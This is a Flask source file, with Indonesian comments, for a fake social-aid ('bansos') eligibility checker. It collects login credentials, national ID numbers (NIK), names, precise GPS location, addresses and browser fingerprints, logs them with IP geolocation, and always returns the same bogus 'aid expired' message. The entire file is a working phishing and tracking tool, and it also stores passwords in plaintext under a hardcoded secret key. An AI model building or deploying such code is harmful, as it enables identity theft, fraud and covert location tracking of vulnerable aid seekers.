from flask import Flask, request, render_template, jsonify, session, redirect, url_for
import requests
from datetime import datetime
import json
import os
import uuid

app = Flask(__name__)
app.secret_key = 'zmmssmwiwo29293jrtmfnndksoa9osksmKeTTY5'

# File JSON untuk menyimpan data
USERS_FILE = 'users.json'
LOGS_FILE = 'logs.json'

# Inisialisasi file JSON
def init_json_files():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump([], f, indent=4)
    
    if not os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, 'w', encoding='utf-8') as f:
            json.dump([], f, indent=4)

init_json_files()

def read_json(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def write_json(file_path, data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def get_client_info():
    """Mendapatkan semua informasi client yang possible"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Informasi dari IP
    ip_info = {}
    try:
        geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        ip_info = geo_response.json()
    except:
        ip_info = {
            "status": "fail",
            "message": "Cannot get IP info"
        }
    
    return {
        "ip_address": ip,
        "user_agent": user_agent,
        "ip_info": ip_info,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_id": session.get('session_id', str(uuid.uuid4())),
        "headers": dict(request.headers)
    }

def log_activity(nik, nama, location_data, akun_login, additional_data=None):
    logs = read_json(LOGS_FILE)
    
    client_info = get_client_info()
    
    log_entry = {
        "log_id": str(uuid.uuid4()),
        "timestamp": datetime.now().isoformat(),
        
        # Data User Input
        "user_input": {
            "nik": nik,
            "nama": nama
        },
        
        # Data Login
        "login_info": {
            "akun_login": akun_login,
            "user_id": session.get('user_id'),
            "username": session.get('username'),
            "email": session.get('email'),
            "login_type": session.get('login_type')
        },
        
        # Data Lokasi Akurat
        "location_data": location_data,
        
        # Data Client Lengkap
        "client_info": client_info,
        
        # Data Tambahan
        "additional_data": additional_data or {},
        
        # Status Bansos
        "status_bansos": "BANSOS SUDAH KADALUARSA, CEK LAGI 1 BULAN KEDEPAN",
        
        # System Info
        "server_timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    logs.append(log_entry)
    write_json(LOGS_FILE, logs)
    
    # Print ke console untuk monitoring real-time
    print(f"\n📊 DATA USER BARU DITERIMA:")
    print(f"🆔 Log ID: {log_entry['log_id']}")
    print(f"⏰ Waktu: {log_entry['timestamp']}")
    print(f"👤 User: {akun_login}")
    print(f"📝 NIK: {nik}")
    print(f"👨‍💼 Nama: {nama}")
    print(f"📍 Lokasi: {location_data.get('address', 'N/A')}")
    print(f"🎯 Koordinat: {location_data.get('latitude', 'N/A')}, {location_data.get('longitude', 'N/A')}")
    print(f"📡 Akurasi: ±{location_data.get('accuracy', 'N/A')} meter")
    print(f"🌐 IP: {client_info['ip_address']}")
    print(f"🖥️ User Agent: {client_info['user_agent'][:50]}...")
    print("=" * 50)

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    
    # Generate session ID untuk tracking
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    
    client_info = get_client_info()
    print(f"\n🌐 VISITOR BARU:")
    print(f"🆔 Session ID: {session['session_id']}")
    print(f"📡 IP: {client_info['ip_address']}")
    print(f"🏙️ Kota: {client_info['ip_info'].get('city', 'Unknown')}")
    print(f"🌍 Negara: {client_info['ip_info'].get('country', 'Unknown')}")
    print(f"🖥️ Browser: {client_info['user_agent'][:80]}...")
    
    return render_template("index.html")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        login_type = request.form.get('login_type')
        
        if not email or not password:
            return render_template('login.html', error="Email dan password harus diisi")
        
        users = read_json(USERS_FILE)
        
        user = None
        for u in users:
            if u['email'] == email and u['password'] == password and u['login_type'] == login_type:
                user = u
                break
        
        if user:
            session['user_id'] = user['id']
            session['email'] = user['email']
            session['username'] = user['username']
            session['login_type'] = user['login_type']
            
            # Log login activity
            client_info = get_client_info()
            print(f"\n🔐 LOGIN BERHASIL:")
            print(f"👤 User: {user['username']} ({user['email']})")
            print(f"📡 IP: {client_info['ip_address']}")
            print(f"📍 Lokasi: {client_info['ip_info'].get('city', 'Unknown')}, {client_info['ip_info'].get('country', 'Unknown')}")
            
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Email atau password salah")
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        login_type = request.form.get('login_type')
        
        if not username or not email or not password:
            return render_template('register.html', error="Semua field harus diisi")
        
        if password != confirm_password:
            return render_template('register.html', error="Password tidak cocok")
        
        users = read_json(USERS_FILE)
        
        for user in users:
            if user['email'] == email:
                return render_template('register.html', error="Email sudah terdaftar")
        
        new_user = {
            "id": len(users) + 1,
            "username": username,
            "email": email,
            "password": password,
            "login_type": login_type,
            "created_at": datetime.now().isoformat(),
            "registration_ip": request.headers.get('X-Forwarded-For', request.remote_addr)
        }
        
        users.append(new_user)
        write_json(USERS_FILE, users)
        
        session['user_id'] = new_user['id']
        session['email'] = email
        session['username'] = username
        session['login_type'] = login_type
        
        print(f"\n✅ REGISTRASI BARU:")
        print(f"👤 User: {username} ({email})")
        print(f"🔐 Login Type: {login_type}")
        print(f"📡 IP: {new_user['registration_ip']}")
        
        return redirect(url_for('dashboard'))
    
    return render_template('register.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    return render_template('dashboard.html', 
                         username=session.get('username'),
                         email=session.get('email'),
                         login_type=session.get('login_type'))

@app.route('/cek_bansos', methods=['POST'])
def cek_bansos():
    if 'user_id' not in session:
        return jsonify({'error': 'Silakan login terlebih dahulu'}), 401
    
    nik = request.form.get('nik')
    nama = request.form.get('nama')
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')
    accuracy = request.form.get('accuracy')
    address = request.form.get('address')
    browser_info = request.form.get('browser_info')
    screen_resolution = request.form.get('screen_resolution')
    
    if not nik or not nama:
        return render_template('dashboard.html', 
                             error="NIK dan nama harus diisi",
                             username=session.get('username'),
                             email=session.get('email'),
                             login_type=session.get('login_type'))
    
    # Data lokasi akurat
    location_data = {
        "latitude": latitude,
        "longitude": longitude,
        "accuracy": accuracy,
        "address": address,
        "location_timestamp": datetime.now().isoformat()
    }
    
    # Data tambahan
    additional_data = {
        "browser_info": browser_info,
        "screen_resolution": screen_resolution,
        "form_submitted_at": datetime.now().isoformat()
    }
    
    # Simpan data ke logs
    akun_login = f"{session.get('username')} ({session.get('email')})"
    log_activity(nik, nama, location_data, akun_login, additional_data)
    
    # Selalu tampilkan pesan yang sama
    return render_template('dashboard.html',
                         result_message="❌ BANSOS SUDAH KADALUARSA, CEK LAGI 1 BULAN KEDEPAN",
                         username=session.get('username'),
                         email=session.get('email'),
                         login_type=session.get('login_type'))

@app.route('/get_location')
def get_location():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        geo = geo_response.json()
        return jsonify({
            'success': True,
            'ip': ip,
            'data': geo
        })
    except:
        return jsonify({'success': False, 'error': 'Cannot get location'})

@app.route('/track', methods=['POST'])
def track():
    data = request.get_json()
    print(f"\n🎯 GPS TRACKING:")
    print(f"📍 Lat: {data.get('lat')}")
    print(f"📍 Lon: {data.get('lon')}")
    print(f"📏 Accuracy: ±{data.get('accuracy')}m")
    print(f"🖥️ Browser: {data.get('browser', 'Unknown')}")
    print(f"📱 Screen: {data.get('screen', 'Unknown')}")

    return jsonify({"status": "tracked"})

@app.route('/logout')
def logout():
    print(f"\n🚪 LOGOUT: {session.get('username')} ({session.get('email')})")
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
